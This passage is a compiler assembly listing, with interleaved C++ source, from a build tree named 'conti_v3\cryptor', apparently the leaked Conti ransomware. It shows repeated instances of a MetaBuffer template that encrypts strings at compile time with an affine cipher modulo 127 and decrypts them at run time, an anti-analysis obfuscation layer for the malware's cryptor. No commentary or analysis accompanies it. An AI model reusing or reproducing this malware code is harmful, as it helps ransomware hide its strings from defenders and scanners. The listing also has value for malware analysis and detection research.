  00017	c6 41 06 0f	 mov	 BYTE PTR [rcx+6], 15
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 0f	 mov	 BYTE PTR [rcx+8], 15
  00023	c6 41 09 1c	 mov	 BYTE PTR [rcx+9], 28
  00027	c6 41 0a 0f	 mov	 BYTE PTR [rcx+10], 15
  0002b	c6 41 0b 0f	 mov	 BYTE PTR [rcx+11], 15
  0002f	c6 41 0c 0f	 mov	 BYTE PTR [rcx+12], 15
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 70	 mov	 BYTE PTR [rcx+1], 112	; 00000070H
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 22	 mov	 BYTE PTR [rcx+5], 34	; 00000022H
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 38	 mov	 BYTE PTR [rcx+7], 56	; 00000038H
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 22	 mov	 BYTE PTR [rcx+9], 34	; 00000022H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	c6 41 0b 30	 mov	 BYTE PTR [rcx+11], 48	; 00000030H
  0002f	c6 41 0c 30	 mov	 BYTE PTR [rcx+12], 48	; 00000030H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 43 00 00 00	 mov	 eax, 67			; 00000043H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 20	 mov	 BYTE PTR [rcx+1], 32	; 00000020H
  00007	c6 41 02 43	 mov	 BYTE PTR [rcx+2], 67	; 00000043H
  0000b	c6 41 03 25	 mov	 BYTE PTR [rcx+3], 37	; 00000025H
  0000f	c6 41 04 43	 mov	 BYTE PTR [rcx+4], 67	; 00000043H
  00013	c6 41 05 31	 mov	 BYTE PTR [rcx+5], 49	; 00000031H
  00017	c6 41 06 43	 mov	 BYTE PTR [rcx+6], 67	; 00000043H
  0001b	c6 41 07 1f	 mov	 BYTE PTR [rcx+7], 31
  0001f	c6 41 08 43	 mov	 BYTE PTR [rcx+8], 67	; 00000043H
  00023	c6 41 09 43	 mov	 BYTE PTR [rcx+9], 67	; 00000043H
  00027	c6 41 0a 43	 mov	 BYTE PTR [rcx+10], 67	; 00000043H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1e 00 00 00	 mov	 eax, 30
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 67	 mov	 BYTE PTR [rcx+1], 103	; 00000067H
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 18	 mov	 BYTE PTR [rcx+3], 24
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 12	 mov	 BYTE PTR [rcx+5], 18
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 0c	 mov	 BYTE PTR [rcx+7], 12
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 3b	 mov	 BYTE PTR [rcx+9], 59	; 0000003bH
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	c6 41 0b 1e	 mov	 BYTE PTR [rcx+11], 30
  0002f	c6 41 0c 1e	 mov	 BYTE PTR [rcx+12], 30
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 15	 sub	 ecx, 21

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 26	 mov	 BYTE PTR [rcx+1], 38	; 00000026H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 25	 mov	 BYTE PTR [rcx+3], 37	; 00000025H
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 4c	 mov	 BYTE PTR [rcx+5], 76	; 0000004cH
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 15	 mov	 BYTE PTR [rcx+9], 21
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 7c	 sub	 ecx, 124		; 0000007cH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

